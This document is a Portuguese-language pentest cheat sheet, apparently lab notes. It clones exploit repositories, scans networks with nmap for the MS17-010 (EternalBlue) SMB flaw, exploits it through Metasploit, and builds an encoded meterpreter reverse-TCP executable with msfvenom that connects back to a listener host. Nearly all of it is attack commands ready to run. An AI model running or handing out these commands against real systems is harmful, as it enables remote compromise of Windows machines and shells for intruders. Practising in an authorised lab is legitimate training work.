git clone https://github.com/vaamonde/nmap-nse-scripts
 
git clone https://github.com/vaamonde/exploit

git clone https://github.com/vaamonde/Eternalblue-Doublepulsar-Metasploit

git clone https://github.com/vaamonde/FakeImageExploiter

Verificar versão do NMAP:<br>	
nmap --version<br>

Manual do NMAP<br>
man nmap<br>
				
nmap -O -A -sV 10.26.46.0/24<br>
-O = detecção do Sistema Operacional<br>
-A = detecção do Sistema Operacional e Versão<br>
-sV = detecção do Sistema Operacional e Versão<br>

nmap -sS 10.26.46.45/24<br>
-sS = detecção de portas TCP<br>

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse localhost<br>
-d = habilita a Debug (log detalhado, pode ir até a opção 9)<br>
-sC = habilitar o rastreamento de scan de portas<br>
-p = número da porta a rastrear (445 - Microsoft-df - SMB/CIFS)<br>
--open = verificar somente portas abertas<br>
--max-hostgroup = número máximo de grupos para o scaneamento<br>
--script = indicar script remoto para o scan<br>

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.0/24<br>

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.150<br>

Atualizar o Metasploit:		msfupdate<br>
Acessar o Metasploit:		msfconsole<br>
Reload dos Exploit:		reload_all<br>
Acessar o Modo Scan:<br>	use auxiliary/scanner/smb/smb_ms17_010<br>
				show options<br>
				set rhosts 192.168.1.1<br>
				exploit<br>
							
Acessar o modo Exploit:	<br>	use exploit/ms17_010/ms_17_010<br>
				show options<br>
				set rhosts 192.168.1.1<br>
				exploit<br>
				
use exploit/multi/handler 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
set LHOST 10.26.46.
msfvenom -h

#Novo terminal
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.26.46.40 LPORT=4444 -f exe -e x64/shikata_ga_nai -i 10 > /root/exploit.exe

#Copiar arquivo eicar.com para o Windows, pode usar o exploit/ms17_010 com a opção upload ou acessar via pasta compartilhada.
